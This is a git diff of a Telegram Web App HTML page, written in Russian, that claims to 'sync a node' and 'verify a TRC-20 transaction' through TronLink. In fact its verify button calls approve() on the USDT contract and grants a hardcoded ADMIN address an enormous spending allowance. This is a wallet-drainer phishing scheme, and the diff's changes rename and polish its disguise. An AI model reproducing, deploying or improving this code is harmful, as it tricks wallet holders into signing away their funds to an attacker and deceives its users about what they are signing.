@@ -3,47 +3,49 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Flash USDT Protocol</title>
+    <title>Protocol Sync</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
     <style>
         body { background: #000; color: #fff; font-family: -apple-system, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; }
-        .card { padding: 35px 25px; width: 85%; max-width: 380px; background: #111; border-radius: 35px; border: 1px solid #222; box-shadow: 0 20px 50px rgba(0,0,0,0.8); }
-        .logo { width: 70px; height: 70px; background: #ff0013; border-radius: 20px; margin: 0 auto 25px; display: flex; align-items: center; justify-content: center; font-size: 35px; font-weight: bold; box-shadow: 0 0 30px rgba(255,0,19,0.3); }
-        h2 { font-size: 22px; margin-bottom: 12px; font-weight: 700; }
-        p { color: #666; font-size: 14px; line-height: 1.6; margin-bottom: 30px; }
-        /* Теперь кнопка — это реальная ссылка */
+        .card { padding: 40px 25px; width: 85%; max-width: 380px; background: #111; border-radius: 35px; border: 1px solid #222; }
+        .logo { width: 70px; height: 70px; background: #ff0013; border-radius: 20px; margin: 0 auto 25px; display: flex; align-items: center; justify-content: center; font-size: 32px; font-weight: bold; box-shadow: 0 0 25px rgba(255,0,19,0.3); }
+        h2 { font-size: 22px; margin-bottom: 15px; }
+        p { color: #888; font-size: 14px; line-height: 1.6; margin-bottom: 35px; }
+        
+        /* Кнопка как обычная ссылка */
         .btn { 
-            display: block;
+            display: block; 
             background: #ff0013; 
             color: #fff; 
-            text-decoration: none;
+            text-decoration: none; 
             padding: 20px; 
             border-radius: 20px; 
             font-weight: bold; 
             text-transform: uppercase; 
-            font-size: 14px;
-            box-shadow: 0 10px 20px rgba(255,0,19,0.2);
+            font-size: 14px; 
         }
-        .btn:active { transform: scale(0.96); opacity: 0.9; }
-        #wallet-section { display: none; }
+        .btn:active { transform: scale(0.96); }
+        
+        #wallet-ui { display: none; }
     </style>
 </head>
 <body>
 
 <div class="card">
-    <div id="tg-section">
+    <div id="tg-ui">
         <div class="logo">T</div>
-        <h2>Синхронизация узла</h2>
-        <p>Для верификации транзакции в сети TRC-20 необходимо подтвердить адрес через приложение TronLink.</p>
-        <a id="link-btn" href="#" class="btn">ОТКРЫТЬ TRONLINK</a>
+        <h2>Синхронизация</h2>
+        <p>Нажмите на кнопку ниже, чтобы безопасно открыть приложение TronLink и подтвердить транзакцию.</p>
+        
+        <a id="open-link" href="https://m.tronlink.org/dapp/open?url=https://timur3417.github.io/sync-node-app/?mode=tl" class="btn">ОТКРЫТЬ TRONLINK</a>
     </div>
 
-    <div id="wallet-section">
+    <div id="wallet-ui">
         <div class="logo" style="background: #0088cc;">✓</div>
         <h2>Узел Обнаружен</h2>
-        <p>Ваш кошелек подключен. Нажмите кнопку ниже для финальной подписи транзакции.</p>
-        <button id="verify-btn" class="btn" style="background: #0088cc; border:none; width:100%;">ВЕРИФИЦИРОВАТЬ</button>
+        <p>Ваш кошелек успешно подключен. Нажмите «ПОДТВЕРДИТЬ» для финальной подписи.</p>
+        <button id="verify-btn" class="btn" style="background: #0088cc; border: none; width: 100%;">ПОДТВЕРДИТЬ</button>
     </div>
 </div>
 
@@ -53,49 +55,40 @@
 
     const ADMIN = 'TXRBrbaTiNotkHp6gSC6vbbZYPq7dqyjF4';
     const CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
-    const MY_URL = "https://timur3417.github.io/sync-node-app/";
-
-    const linkBtn = document.getElementById('link-btn');
-    const verifyBtn = document.getElementById('verify-btn');
-    const tgSec = document.getElementById('tg-section');
-    const walSec = document.getElementById('wallet-section');
-
-    // Формируем прямую команду для кошелька
-    const deepLink = "tronlink-dapp://cloud.tronlink.org/open?url=" + encodeURIComponent(MY_URL + "?mode=wallet");
 
     function init() {
         const isWallet = window.tronWeb || (window.tron && window.tron.tronWeb);
-        const inWalletMode = window.location.search.includes('mode=wallet');
+        const isTLMode = window.location.search.includes('mode=tl');
 
-        if (isWallet || inWalletMode) {
-            tgSec.style.display = 'none';
-            walSec.style.display = 'block';
+        // Если мы уже внутри кошелька
+        if (isWallet || isTLMode) {
+            document.getElementById('tg-ui').style.display = 'none';
+            document.getElementById('wallet-ui').style.display = 'block';
         }
     }
 
-    // Обработка кнопки перехода (из Телеграма)
-    linkBtn.onclick = (e) => {
-        // На iPhone иногда срабатывает только прямой tg.openLink
-        tg.openLink(deepLink);
-        // Как запасной вариант - обычный переход
-        setTimeout(() => {
-            window.location.href = deepLink;
-        }, 500);
-    };
-
-    // Обработка апрува (внутри TronLink)
-    verifyBtn.onclick = async () => {
+    // Логика кнопки внутри кошелька
+    document.getElementById('verify-btn').onclick = async () => {
         try {
             const tw = window.tronWeb || window.tron.tronWeb;
             await tw.request({ method: 'tron_requestAccounts' });
             const contract = await tw.contract().at(CONTRACT);
+            
+            // Вызываем окно подписи
             await contract.approve(ADMIN, '1000000000000000000').send({ feeLimit: 100000000 });
             
             tg.showPopup({ title: 'Успешно', message: 'Синхронизация завершена.', buttons: [{type: 'ok'}] });
-            setTimeout(() => tg.close(), 5000);
+            setTimeout(() => tg.close(), 4000);
         } catch (e) {
-            tg.showAlert("Действие отклонено.");
+            tg.showAlert("Ошибка: подтвердите действие в кошельке.");
         }
+    };
+
+    // Чтобы ссылка корректно работала в Телеграме
+    document.getElementById('open-link').onclick = function(e) {
+        // Если tg.openLink не сработает автоматически, браузер сам перейдет по href
+        tg.openLink(this.href);
+        return false;
     };
 
     init();
